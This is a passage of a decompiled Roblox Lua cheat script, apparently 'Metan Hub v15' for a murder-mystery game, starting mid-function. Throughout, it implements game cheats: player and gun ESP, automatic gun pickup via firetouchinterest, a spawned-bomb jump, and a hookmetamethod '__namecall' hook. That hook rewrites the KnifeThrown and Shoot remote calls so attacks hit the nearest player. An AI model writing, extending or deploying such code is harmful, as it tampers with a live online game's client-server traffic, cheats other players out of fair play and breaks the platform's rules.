                    __ThemeBG.Image = v560

                    return
                end

                local ImageLabel = Instance.new("ImageLabel")

                ImageLabel.Name = "__ThemeBG"
                ImageLabel.Size = UDim2.fromScale(1, 1)
                ImageLabel.BackgroundTransparency = 1
                ImageLabel.ScaleType = Enum.ScaleType.Crop
                ImageLabel.ZIndex = 0
                ImageLabel.Image = v560
                ImageLabel.Parent = AcrylicPaint.Frame
            end
        end)
    end
end
})
t3.value126.Settings:AddSection("Config")
t1.value2 = t3.value126.Settings
t1.value2:AddButton({
	Title = "Save Settings",
	Callback = function()
    v32()
    t3.value18("Saved", "", "Success", nil, 2)
end
})
t1.value2 = t3.value126.Settings
t1.value18 = t1.value2.AddButton
t1.value18(t1.value2, {
	Title = "Load Settings",
	Callback = function()
    if t3.value50() then
        t3.value18("Loaded", "", "Success", nil, 2)

        return
    end

    t3.value18("No save file", "", "Error", nil, 2)
end
})
t1.value18 = t3.value126.Misc:AddCollapsibleSection("Bomb Jump", "lucide/party-popper", true)
t1.value2 = _G
t1.value2.BombJump = {
	Enabled = false,
	PCKeybind = "B",
	MobileButton = false
}
function t3.value153()
    local Character = t3.value11.Character

    if not Character then
        return
    end

    local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")

    if not HumanoidRootPart then
        return
    end

    local PrankBomb = t3.value15:FindFirstChild("PrankBomb")

    if not PrankBomb then
        t3.value7:Notify({
			Title = "Bomb Jump",
			Content = "PrankBomb not found!",
			Duration = 2
		})

        return
    end

    local clone = PrankBomb:Clone()

    clone.Parent = workspace
    clone:PivotTo(HumanoidRootPart.CFrame * CFrame.new(0, -3, 0))
end
t1.value18.AddToggle(t1.value18, "BombJumpToggle", {
	Title = "Enable Bomb Jump",
	Default = false,
	Callback = function(p140)
    _G.BombJump.Enabled = p140
    v32()
end
})
t1.value18.AddKeybind(t1.value18, "BombJumpPCKeybind", {
	Title = "PC Keybind",
	Mode = "Toggle",
	Default = "B",
	Callback = function(p141)
    _G.BombJump.PCKeybind = p141
    v32()
end
})
t1.value18.AddToggle(t1.value18, "BombJumpMobileButton", {
	Title = "Show Mobile Button",
	Default = false,
	Callback = function(p142)
    _G.BombJump.MobileButton = p142

    if p142 then
        local v568 = DFunctions.CreateButton("BombJumpBtn", "💣", 0.12, 0.12, function()
            t3.value153()
        end, true)

        _G.BombJump._button = v568
    elseif _G.BombJump._button then
        DFunctions.DestroyButton("BombJumpBtn")
        _G.BombJump._button = nil
    end

    v32()
end
})
local InputBegan = t3.value10.InputBegan
function t1.value2(p143, p144)
    if p144 then
        return
    end

    if _G.BombJump.Enabled and p143.KeyCode == Enum.KeyCode[_G.BombJump.PCKeybind] then
        t3.value153()
    end
end
InputBegan:Connect(t1.value2)
t1.value2 = _G.BombJump
if t1.value2.MobileButton then
    task.wait(0.5)
    t1.value2 = DFunctions.CreateButton("BombJumpBtn", "💣", 0.12, 0.12, function()
        t3.value153()
    end, true)
    _G.BombJump._button = t1.value2
end
t3.value10.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then
        return
    end

    if input.KeyCode == Enum.KeyCode.Space then
        t3.value33 = true
    end

    if _G.FastThrowEnabled and input.KeyCode == Enum.KeyCode[_G.FastThrowKey] then
        t3.value62()
    end

    if _G.KnifeSilentAimEnabled and input.KeyCode == Enum.KeyCode[_G.KnifeSilentAimKey] then
        t3.value63()
    end
end)
t3.value10.InputEnded:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Space then
        t3.value33 = false
    end
end)
t3.value9.PostSimulation:Connect(function()
    if not t3.value33 then
        return
    end

    local Character = t3.value11.Character
    local v575 = Character and Character:FindFirstChild("HumanoidRootPart")
    local v576 = Character and Character:FindFirstChildOfClass("Humanoid")
    local v577 = not v575

    if not v577 then
        v577 = not v576
    end

    if v577 then
        return
    end

    if not (v576:GetState() == Enum.HumanoidStateType.Freefall and os.clock() - t3.value34 > 0.15) then
    end
end)
t3.value11.CharacterAdded:Connect(function(character)
    local Humanoid = character:WaitForChild("Humanoid")

    task.wait(0.5)
    t3.value91()
    Humanoid.Died:Connect(function()
    end)
end)
t3.value11.CharacterRemoving:Connect(t3.value56)

if t3.value19 then
    t3.value19.OnClientEvent:Connect(function(p145)
        if type(p145) == "table" then
            t3.value28 = {}

            local s8 = "Unknown"

            for k, v in pairs(p145) do
                local v584 = k

                if type(v) == "table" and v.Role then
                    t3.value28[v584] = v.Role

                    if v584 == t3.value11.Name then
                        s8 = v.Role
                    end
                end
            end

            if _G.SayRoleEnabled then
                t3.value18("Round Started", "Your role: " .. s8, "Info", nil, 5)
            end
        end
    end)
end
if t3.value20 then
    t3.value20.OnClientEvent:Connect(function()
        t3.value56()
        table.clear(t3.value30)
    end)
end
local function v68(p146)
    if p146.Name == "GunDrop" then
        t3.value30[p146] = true
    end
end
t1.value2 = pairs
local _workspace = workspace
for _, v71 in t1.value2(_workspace:GetDescendants()) do
    v68(v71)
end
workspace.DescendantAdded:Connect(v68)
t1.value2 = workspace.DescendantRemoving
function t1.value7(p147)
    if t3.value30[p147] then
        t3.value30[p147] = nil
    end
end
t1.value2:Connect(t1.value7)
task.spawn(function()
    while true do
        pcall(function()
            t3.value53()
            t3.value91()

            if _G.EspEnabled then
                for _, player in ipairs(t3.value8:GetPlayers()) do
                    t3.value57(player)
                end
            end

            local v853 = t3.value55()

            for k, _ in pairs(t3.value30) do
                local v856 = k

                if v856 and v856.Parent then
                    if _G.AutoGrabEnabled and (v853 ~= "Murderer" and v853 ~= "Sheriff") then
                        local Character = t3.value11.Character
                        local v858 = Character and Character:FindFirstChild("HumanoidRootPart")

                        if v858 then
                            v856:PivotTo(v858.CFrame)

                            if v856:FindFirstChild("TouchInterest", true) or v856:FindFirstChildWhichIsA("TouchTransmitter", true) then
                                firetouchinterest(v858, v856, 0)
                                task.wait()
                                firetouchinterest(v858, v856, 1)
                            end
                        end
                    end

                    if _G.GunEspEnabled then
                        local v859 = v856:FindFirstChild("GunDropHighlight") or Instance.new("Highlight", v856)

                        v859.Name = "GunDropHighlight"
                        v859.FillColor = _G.GunFill
                        v859.FillTransparency = _G.GunFillTrans
                        v859.OutlineColor = _G.GunOutline
                        v859.OutlineTransparency = _G.GunOutlineTrans
                    else
                        local GunDropHighlight = v856:FindFirstChild("GunDropHighlight")

                        if GunDropHighlight then
                            GunDropHighlight:Destroy()
                        end
                    end
                end
            end
        end)
        task.wait(0.1)
    end
end)
t3.value50()
t3.value94(_G.AntiAfkEnabled)
togglePrankBombKeybind(_G.PrankBombKey)
t3.value24:SelectTab(1)
task.delay(1, function()
end)
t3.value18("Metan Hub v15", "Autofarm for new event", "Success", "home", 6)
t1.value2 = _G
t1.value2.SilentAimKnifeHook = false
t1.value2 = _G
t1.value2.SilentAimGunHook = false
t1.value2 = _G
t1.value2.PredictKnifeType = "Traject"
t1.value2 = _G
t1.value2.PredictGunType = "Vazex"
t1.value2 = _G
t1.value2.HeadPrediction = false
t1.value2 = _G
t1.value2.HeadHitChance = 50
t1.value2 = _G
t1.value2.PingBased = false
t1.value2 = _G
t1.value2.ResolverAssistant = false
function t1.value7(p148)
    if not p148 then
        return
    end

    local HumanoidRootPart = p148:FindFirstChild("HumanoidRootPart")
    local Head = p148:FindFirstChild("Head")

    if not HumanoidRootPart or not Head then
        return
    end

    local v603 = HumanoidRootPart.AssemblyLinearVelocity or Vector3.zero
    local Magnitude = v603.Magnitude
    local vector3 = Vector3.new(v603.X, 0, v603.Z)
    local Magnitude3 = (t3.value11.Character.HumanoidRootPart.Position - HumanoidRootPart.Position).Magnitude
    local v607 = math.clamp(Magnitude3 / 900, 0.1, 0.5)
    local v608 = math.clamp(math.clamp(getgenv().CurrentServerPing or 80, 0, 500) / 1000, 0.01, 0.5)

    if _G.PingBased then
        v607 += v608
    end

    local HumanoidRootPartPosition = HumanoidRootPart.Position

    if _G.PredictGunType == "Phaze" then
        HumanoidRootPartPosition = HumanoidRootPart.Position + vector3 * v607 + HumanoidRootPart.CFrame.LookVector * v607 * 0.5
    elseif _G.PredictGunType == "Hexa" then
        local Unit = (t3.value11.Character.HumanoidRootPart.Position - HumanoidRootPart.Position).Unit

        HumanoidRootPartPosition = HumanoidRootPart.Position + Unit * Magnitude * v607 + vector3 * v607
    elseif _G.PredictGunType == "Nova" then
        local Unit = (t3.value11.Character.HumanoidRootPart.Position - HumanoidRootPart.Position).Unit

        HumanoidRootPartPosition = HumanoidRootPart.Position + Unit * Magnitude * v607 + vector3 * v607 + HumanoidRootPart.CFrame.LookVector * v607 * 0.5
    end

    if _G.HeadPrediction and math.random(1, 100) <= _G.HeadHitChance then
        HumanoidRootPartPosition = Head.Position
    end

    if _G.ResolverAssistant then
        local raycastParams = RaycastParams.new()

        raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
        raycastParams.FilterDescendantsInstances = {
			t3.value11.Character,
			p148
		}

        local raycastResult = workspace:Raycast(HumanoidRootPartPosition, Vector3.new(0, -8, 0), raycastParams)

        if raycastResult and math.abs(HumanoidRootPartPosition.Y - raycastResult.Position.Y) < 4 then
            HumanoidRootPartPosition = Vector3.new(HumanoidRootPartPosition.X, math.max(HumanoidRootPartPosition.Y, raycastResult.Position.Y), HumanoidRootPartPosition.Z)
        end
    end

    return HumanoidRootPartPosition
end
function t3.value154(p149)
    if not p149 then
        return
    end

    local HumanoidRootPart = p149:FindFirstChild("HumanoidRootPart")
    local v589 = not HumanoidRootPart
    local Head = p149:FindFirstChild("Head")

    if not v589 then
        v589 = not Head
    end

    if v589 then
        return
    end

    local v591 = HumanoidRootPart.AssemblyLinearVelocity or Vector3.zero
    local Magnitude = v591.Magnitude
    local vector3 = Vector3.new(v591.X, 0, v591.Z)
    local v594 = math.clamp((t3.value11.Character.HumanoidRootPart.Position - HumanoidRootPart.Position).Magnitude / 200, 0.3, 0.5)
    local v595 = math.clamp(math.clamp(getgenv().CurrentServerPing or 80, 0, 500) / 1000, 0.01, 0.5)

    if _G.PingBased then
        v594 += v595
    end

    local v596 = HumanoidRootPart.Position + vector3 * v594

    if _G.PredictKnifeType == "Vectora" then
        v596 = HumanoidRootPart.Position + vector3 * v594 + HumanoidRootPart.CFrame.LookVector * v594
    elseif _G.PredictKnifeType == "Dartix" then
        local Unit = (t3.value11.Character.HumanoidRootPart.Position - HumanoidRootPart.Position).Unit

        v596 = HumanoidRootPart.Position + Unit * Magnitude * v594 + vector3 * v594 + HumanoidRootPart.CFrame.LookVector * v594
    end

    if _G.HeadPrediction and math.random(1, 100) <= _G.HeadHitChance then
        v596 = Head.Position
    end

    if _G.ResolverAssistant then
        local raycastParams = RaycastParams.new()

        raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
        raycastParams.FilterDescendantsInstances = {
			t3.value11.Character,
			p149
		}

        local raycastResult = workspace:Raycast(v596, Vector3.new(0, -8, 0), raycastParams)

        if raycastResult and math.abs(v596.Y - raycastResult.Position.Y) < 4 then
            v596 = Vector3.new(v596.X, math.max(v596.Y, raycastResult.Position.Y), v596.Z)
        end
    end

    return v596
end
t3.value155 = t1.value7
if hookmetamethod then
    local u72
    u72 = hookmetamethod(game, "__namecall", function(p150, ...)
        local t47 = { ... }
        local v616 = getnamecallmethod()

        if not checkcaller() then
            if p150.Name == "KnifeThrown" and (v616 == "FireServer" and _G.SilentAimKnifeHook) then
                local Character = t3.value11.Character
                local v618 = Character and Character:FindFirstChild("HumanoidRootPart")

                if v618 then
                    local t48 = {}
                    for v622, v623 in ipairs(t3.value8:GetPlayers()) do

                        if v623 ~= t3.value11 and (v623.Character and v623.Character:FindFirstChild("HumanoidRootPart")) and (not t3.value52 or not t3.value52(v623)) then
                            table.insert(t48, v623)
                        end
                    end
                    if #t48 > 0 then
                        local n14 = 1e999
                        local v625
                        for v628, v629 in ipairs(t48) do

                            local HumanoidRootPart = v629.Character.HumanoidRootPart
                            local Magnitude = (v618.Position - HumanoidRootPart.Position).Magnitude

                            if Magnitude < n14 then
                                n14 = Magnitude
                                v625 = v629
                            end
                        end
                        if v625 then
                            local v632 = t3.value154(v625.Character)

                            if v632 then
                                t47[1] = CFrame.new(v618.Position)
                                t47[2] = CFrame.new(v632)
                            end
                        end
                    end
                end
            end

            if p150.Name == "Shoot" and (v616 == "FireServer" and _G.SilentAimGunHook) then
                local Character = t3.value11.Character

                if Character and Character:FindFirstChild("Gun") then
                    local t49 = {}
                    for v637, v638 in ipairs(t3.value8:GetPlayers()) do

                        local v639 = v638 ~= t3.value11

                        if v639 then
                            v639 = v638.Character and v638.Backpack:FindFirstChild("Knife") or v638.Character:FindFirstChild("Knife")
                        end

                        if v639 and (not t3.value52 or not t3.value52(v638)) then
                            table.insert(t49, v638)
                        end
                    end
                    if #t49 > 0 then
                        local v640
                        local n15 = 1e999
                        for v644, v645 in ipairs(t49) do

                            local HumanoidRootPart = v645.Character.HumanoidRootPart
                            local Magnitude = (Character.HumanoidRootPart.Position - HumanoidRootPart.Position).Magnitude

                            if Magnitude < n15 then
                                v640 = v645
                                n15 = Magnitude
                            end
                        end
                        if v640 then
                            local v648 = t3.value155(v640.Character)

                            if v648 then
                                local Position = (Character:FindFirstChild("RightHand") or Character.HumanoidRootPart).Position

                                t47[1] = CFrame.new(Position)
                                t47[2] = CFrame.new(v648)
                            end
                        end
                    end
                end
            end
        end

        return u72(p150, unpack(t47))
    end)
end
